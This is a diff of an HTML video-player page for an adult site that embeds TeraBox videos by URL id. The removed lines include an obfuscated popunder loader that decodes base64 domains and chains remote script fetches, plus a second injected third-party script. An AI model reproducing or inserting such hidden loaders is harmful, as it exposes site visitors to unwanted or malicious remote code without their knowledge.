@@ -1,13 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Teen18 Player | Premium Experience</title>
-
-<script type="text/javascript" data-cfasync="false">
-(function(){var f=window,w="c7c81412ec48f0ae361fb200abc24504",j=[["siteId",17-687+205+166-392+5257140],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],u=["d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL3lqcXVlcnkudHlwZWFoZWFkLm1pbi5jc3M=","ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvWUsvYW51bWJlcnMubWluLmpz","d3d3LmxsbmJ1bWl4LmNvbS94anF1ZXJ5LnR5cGVhaGVhZC5taW4uY3Nz","d3d3LmhkZ2N4dGZpcXNpcW8uY29tL2xFQksvc251bWJlcnMubWluLmpz"],a=-1,d,b,h=function(){clearTimeout(b);a++;if(u[a]&&!(1801636382000<(new Date).getTime()&&1<a)){d=f.document.createElement("script");d.type="text/javascript";d.async=!0;var g=f.document.getElementsByTagName("script")[0];d.src="https://"+atob(u[a]);d.crossOrigin="anonymous";d.onerror=h;d.onload=function(){clearTimeout(b);f[w.slice(0,16)+w.slice(0,16)]||h()};b=setTimeout(h,5E3);g.parentNode.insertBefore(d,g)}};if(!f[w]){try{Object.freeze(f[w]=j)}catch(e){}h()}})();
-</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Teen18 Player | Premium Experience</title>
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;}
@@ -18,7 +14,6 @@ body{overflow:hidden;background:#050505;}
     top:0;left:0;
     width:100%;height:100vh;
     background:#000;
-    z-index:1;
 }
 
 #player{
@@ -84,8 +79,6 @@ body{overflow:hidden;background:#050505;}
 
 .no-select{
   -webkit-user-select:none;
-  -moz-user-select:none;
-  -ms-user-select:none;
   user-select:none;
 }
 </style>
@@ -96,46 +89,29 @@ body{overflow:hidden;background:#050505;}
 <header class="header">
     <div class="logo">TEEN<span>18</span> PLAYER</div>
 
-    <!-- 🔥 Updated Button -->
+    <!-- 🔥 Direct TeraBox Button -->
     <a id="teraLink" href="#" target="_blank">
         <div class="status-pill">Open in TeraBox</div>
     </a>
 </header>
 
-<script>
-(function(jqdy){
-var d=document,s=d.createElement('script'),l=d.scripts[d.scripts.length-1];
-s.settings=jqdy||{};
-s.src="//inferior-stick.com/b.XXVYsqdsGSlc0rYjWvcT/Keimg9BuAZWUFlUk/PETpYM3hM/T/I_zgNUjJgAtRNVjkcmxsMCjgM/2uO/QP";
-s.async=true;
-s.referrerPolicy='no-referrer-when-downgrade';
-l.parentNode.insertBefore(s,l);
-})({})
-</script>
-
 <div id="player-container">
-    <iframe 
-        id="player"
-        allowfullscreen
-        scrolling="no">
-    </iframe>
+    <iframe id="player" allowfullscreen scrolling="no"></iframe>
 </div>
 
 <script>
-const urlParams = new URLSearchParams(window.location.search);
-const id = urlParams.get('id') || window.location.search.replace("?=", "");
+const id = window.location.search.replace("?=", "");
 
 if (id) {
-    const teraURL = "https://terabox.beer/watch/" + id;
 
-    // iframe load
-    document.getElementById("player").src = teraURL;
+    // 🎥 iframe player (optional)
+    document.getElementById("player").src = "https://terabox.beer/watch/" + id;
 
-    // 🔥 button link
-    document.getElementById("teraLink").href = teraURL;
+    // 🔥 direct TeraBox open
+    document.getElementById("teraLink").href = "https://1024terabox.com/s/" + id;
 
 } else {
-    console.error("No Video ID found in URL");
+    console.error("No Video ID found");
 }
 </script>
 
